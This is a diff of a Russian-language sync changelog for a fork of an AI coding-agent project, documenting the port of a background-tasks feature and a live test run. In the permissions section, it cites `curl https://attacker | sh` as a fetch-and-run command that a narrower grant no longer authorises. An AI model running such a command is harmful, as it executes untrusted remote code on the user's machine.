@@ -375,14 +375,171 @@ unit-тесты конфигурации/компакции/лимитов, HTTP
 
 ---
 
+## Волна `6d46afe -> 5e44bdb` (тег `0.9.49`) — ГОТОВО
+
+5 не-merge коммитов (2026-07-30…31), одна связная фича **background tasks**: ~9200 строк,
+86 файлов. Портирована четырьмя коммитами на ветке `claude/coddy-agent-port-test-14016f`.
+
+Что даёт: `run_command` получает `background: true` (+ `notify_on_finish`, `expected_seconds`)
+и уходит в пул задач вместо блокирующего ожидания; пять инструментов
+`background_list / background_output / background_wait / background_stop / background_reap`;
+задача с `notify_on_finish` по завершении сама будит агента новым ходом; панель фоновых задач
+в SPA под последним сообщением со своим hash-роутом; ортогональная правка прав —
+опция `allow_always_program`.
+
+### Коммит 1 — движок: `platform/procgroup` + `internal/bgtask` + конфиг (`f836c26`)
+
+`internal/bgtask` (6 файлов + 1012-строчный тест) взят у upstream без изменений, кроме ребренда.
+Конфиг: секция `tools.background` (`enabled`/`max_concurrent`/`default_timeout_seconds`/
+`max_timeout_seconds`/`output_buffer_bytes`) + jsondto/ui_schema/docs/example, перегенерированная
+фикстура `ui-schema.json` и RU-оверлей `schema.ru.ts`.
+
+**Расхождение с upstream — `ProcessGroupAlive` на Windows (осознанное).**
+Upstream пробует pid через `os.FindProcess`, что отвечает на вопрос «могу ли я открыть этот pid»,
+а не «жив ли он», и врёт в обе стороны. Проверено эмпирически на этой машине:
+
+- `os.FindProcess` открывает с `PROCESS_QUERY_INFORMATION`, который запрещён между контекстами
+  безопасности, поэтому выживший процесс, запущенный с повышением или от другого пользователя,
+  читается как мёртвый и никогда не будет прибран. На pid 4 (`System`): upstream `false`,
+  у нас `true`.
+- Объект процесса живёт, пока открыт хоть один хэндл, а `bgtask` держит такой хэндл на каждую
+  запущенную задачу, поэтому завершившийся потомок читается как живой. Проверено:
+  upstream `true`, у нас `false`.
+
+У нас: `OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION)` (выдаётся между уровнями целостности) +
+`GetExitCodeProcess`, живым считается только `STILL_ACTIVE`; access-denied означает «процесс есть,
+но защищён», то есть жив. Покрыто `internal/platform/procgroup_windows_test.go`.
+
+Конфиг следует форковым конвенциям, а не upstream: прямое копирование указателей в `jsondto`
+(в форке нет `cloneBoolPtr`/`cloneIntPtr`) и без `omitempty` на struct-поле.
+
+### Коммит 2 — инструменты, права, агент (`98c809a`)
+
+`run_command` плюс пять `background_*` тулов за `tools.background.enabled`, `BackgroundWaker`,
+`permission.Options` вместо трёх захардкоженных опций, `program.go` с `allow_always_program`.
+Гранты сессии больше не делят префиксный матч с конфиговым allowlist: грант расширяется только
+на кандидата, который сам является «простым вызовом», поэтому одобрение `curl https://trusted`
+не авторизует `curl https://attacker | sh`.
+
+**Расхождение — режимы.** У upstream два режима, у форка четыре:
+
+- `plan` — четыре наблюдающих тула (как в upstream), без `background_reap`;
+- `ask` (extended) — они же: ask уже даёт `run_command`, значит фоновая задача достижима
+  и должна оставаться наблюдаемой;
+- `ask` basic-only и `docs` — ничего: там нечем запустить команду;
+- `background_reap` остаётся только в agent-режиме: он убивает группы процессов,
+  которые эта сессия не запускала.
+
+Закреплено `internal/agent/background_toolset_test.go`, включая путь отказа во время исполнения
+(`toolCallRefusedByMode`) — в upstream этого покрытия нет.
+
+Плюс восемь попутных gofmt-фиксов из того же диапазона (`ssh/exec.go`, `todo/*.go`), которые
+в форке разошлись идентично.
+
+### Коммит 3 — HTTP-слой (`9a8f668`)
+
+Роуты `/foxxycode/sessions/{id}/background-tasks` (list / clear / get-with-output / stop),
+`StopSession` при удалении сессии, закрытие пула в `Drain` и открытие в `New`,
+`attachBackgroundWaker`.
+
+**Расхождение — ретрай на `session_busy` (осознанное).** У upstream turn-lock ставит в очередь,
+поэтому wake, прилетевший в середине хода, просто ждёт. У форка он падает быстро с
+`ErrSessionTurnBusy` — то же поведение, благодаря которому композер отвечает 409 `session_busy`,
+а не висит, — и `BackgroundWaker` выбрасывает батч, чей `run` вернул ошибку. При портировании
+1:1 задача, завершившаяся пока пользователь ведёт ход, теряла бы уведомление совсем, что
+обесценивает `notify_on_finish`.
+
+`runWakeTurn` поэтому ретраит на `ErrSessionTurnBusy` с экспоненциальной задержкой (1 с, потолок
+15 с) в бюджете 10 минут и немедленно сдаётся, как только пул начал drain, чтобы вечно занятая
+сессия не держала горутину и `bgWG` после shutdown. Ретрай живёт в HTTP-слое, а не в
+`internal/agent`: сам waker остаётся идентичным upstream, а семантика сессий — там, где ей место.
+Покрыто `external/httpserver/background_wake_busy_test.go`.
+
+### Коммит 4 — SPA, docs, этот файл
+
+`external/ui/src/ui/tasks/*` (панель, чип, `taskStatus.ts`, `api.ts`), hash-роут
+`#/s/<id>/tasks[/<taskId>]` (файл `hashRoute.ts` побайтово совпадал с upstream, патч применён
+как есть), чип-тикер в `ToolCallMessage`, ~605 строк CSS.
+
+**Расхождение — i18n.** Upstream-версия панели целиком английская. У нас весь слой переведён:
+ключи `tasks.*` и `messages.toolBgTask*` в `en.ts` и `ru.ts`, `taskStatus.ts` и `api.ts` берут
+строки через `t()` из `i18n/i18n.ts` (приём для не-React кода). Плюрализация чипа сделана выбором
+ключа (`…One`/`…Many`), а не приклеиванием «s», потому что в русском три формы; RU использует
+форму с двоеточием, корректную для любого числа.
+
+**Расхождение — подписи кнопок разрешений.** Новая опция приходит с бэкенда как
+`Always allow <grant>` — динамическая строка. Добавлен `chat/permissionOptionLabel.ts`: переводит
+по стабильному `optionId`, а имя программы вытаскивает из английского префикса (тот же приём,
+что в `chat/compactionSummary.ts`). Побочно чинит предсуществующий пробел форка: живые
+permission-карточки рендерили `opt.name` с бэкенда, то есть `Allow`/`Allow always`/`Reject`
+оставались английскими даже в RU-локали.
+
+**CSS:** запрещённых Chromium-104 конструкций в новых 605 строках не оказалось
+(`color-mix(in srgb, …)` разрешён и компилируется postcss-плагином); заменены только
+`--coddy-*` переменные на `--foxxycode-*`. `npm run check:compat` зелёный.
+
+---
+
+### Живой прогон (реальный провайдер `neuraldeep`)
+
+Бинарь `-tags "http ui"`, изолированные home/config вне репозитория, ключ только через
+`NEURALDEEP_API_KEY`. Модели: `neuraldeep/gpt-oss-120b` и
+`neuraldeep/qwen3.6-35b-a3b-noreason`. Все десять сценариев прошли.
+
+- **Запуск и сбор результата.** `examples/httpserver/http_e2e_background.py` зелёный на
+  обеих моделях (`bg_2`, `bg_3`): задача стартует, список отдаёт её, вывод читается
+  на лету, статус доходит до терминального.
+- **Панель.** Чип «1 фоновая задача» под последним сообщением, роут `#/s/<id>/tasks`,
+  класс `shell-tasks-open`, детальная панель на `#/s/<id>/tasks/bg_1`; перезагрузка
+  на диплинке восстанавливает и панель, и выбранную задачу вместе с выводом.
+  Тикер в строке тулкола: «Успешно · 30s · оценка 30s · код 0». Консоль чистая.
+- **Убийство дерева процессов (Windows).** Задача `ping -n 120` порождает дочерний
+  процесс; `stop` снял оба (2 ping до → 1 после, оставшийся не наш), статус `stopped`.
+- **Wake-on-finish.** Транскрипт вырос сам, без ввода: пришло user-сообщение
+  «A background task you asked to be notified about has finished… bg_6 [succeeded]».
+- **Ретрай на `session_busy`** (форковое расхождение) — воспроизведён на живом стенде:
+  задача завершилась в середине пользовательского хода, в логе шесть попыток
+  `background_wake_busy_retry` с задержками 1s/2s/4s/8s/15s/15s, затем
+  `background_wake_finish`. Без ретрая уведомление было бы потеряно на первой же ошибке.
+- **Осиротевшие задачи и `reap`** (проверка Windows-фикса). Бинарь убит с живой задачей;
+  дерево (`powershell` + `PING.EXE`) пережило смерть процесса. После рестарта задача
+  показана как `orphaned`, `background_reap` снёс дерево целиком («both gone»),
+  повторный `reap` вернул «No leftover background processes from an earlier run» —
+  то есть проба живости не таскиллит уже мёртвый (возможно переиспользованный) pid.
+- **Лимиты и таймаут.** При `max_concurrent: 5` стартовали ровно 5 задач, шестая
+  отбита: `background task pool is full for this session (limit 5)`.
+  `timeout_seconds: 5` против `Start-Sleep -Seconds 60` дал статус `timed_out`.
+- **`tools.background.enabled: false`.** Инструменты исчезают из определений
+  (модель отвечает «NONE AVAILABLE»), `background: true` отбивается внятным
+  «background tasks are disabled (tools.background.enabled is false)».
+- **Права.** Для `Start-Sleep …; Write-Output …` (метасимволы) четвёртая кнопка
+  **не** предлагается — верно. Для `git status` карточка даёт четыре кнопки, включая
+  локализованную «Всегда разрешать git status». После неё `git status --short`
+  выполняется без запроса, а `git status --short | Select-String foo` спрашивает снова
+  и уже без программной опции — грант не расширяется на конвейер.
+- **Режимы.** В `plan` и в `ask` модель видит ровно четыре наблюдающих инструмента
+  и сообщает, что `background_reap` недоступен.
+
+**Найдено и починено по итогам прогона:** upstream-овские `http_e2e_background.py` и
+`acp_e2e_background.py` зашивают POSIX-цикл `for i in 1 2 3 …`, который PowerShell не
+принимает, поэтому на Windows задача падала с `exit 1` раньше, чем харнесс успевал
+что-либо проверить. Команда теперь собирается по `platform.system()` — тот же приём,
+что у `bddSleepCommand` в Go-харнессах (коммит `a06d55f`).
+
+**Мелочь, оставленная намеренно:** `formatDuration` отдаёт `30s` / `1m35s` и в русской
+локали. Это тот же компактный словарь, что печатает бэкенд в выводе инструментов, и он
+намеренно не переводится — как префиксы в `chat/compactionSummary.ts`.
+
+---
+
 ## Последняя синхронизация
 
 | Поле | Значение |
 | --- | --- |
-| **Дата** | 2026-07-29 |
-| **Синхронизировано до `upstream/main`** | `6d46afe` (2026-07-29) |
-| **Ближайший upstream-тег** | `0.9.48` |
-| **Наш коммит-порт** | подготовлен на ветке `codex/sync-upstream-6d46afe` |
+| **Дата** | 2026-08-01 |
+| **Синхронизировано до `upstream/main`** | `5e44bdb` (2026-07-31) |
+| **Ближайший upstream-тег** | `0.9.49` |
+| **Наш коммит-порт** | `f836c26`, `98c809a`, `9a8f668` плюс коммит SPA — ветка `claude/coddy-agent-port-test-14016f` |
 | **Отложенные follow-up** | четыре PNG `docs/assets/screenshot-tool-previews*.png` — тянутся с волны `6666606 → 19754e8`, см. её раздел; плюс «Известные риски этой волны» выше |
 
 ---
@@ -461,7 +618,7 @@ unit-тесты конфигурации/компакции/лимитов, HTTP
 ## Как обновить этот файл в следующий раз
 
 1. `git fetch upstream --prune`
-2. `git log --oneline --no-merges 6d46afe..upstream/main` — список кандидатов.
+2. `git log --oneline --no-merges 5e44bdb..upstream/main` — список кандидатов.
 3. Портировать непортированное (ребренд `coddy → foxxycode`; см. `AGENTS.md` / память форка).
 4. Прогнать гейты: `make test`, `make lint`, `npm --prefix external/ui run build:go`.
 5. Обновить таблицу «Последняя синхронизация» выше на новый `upstream/main`.
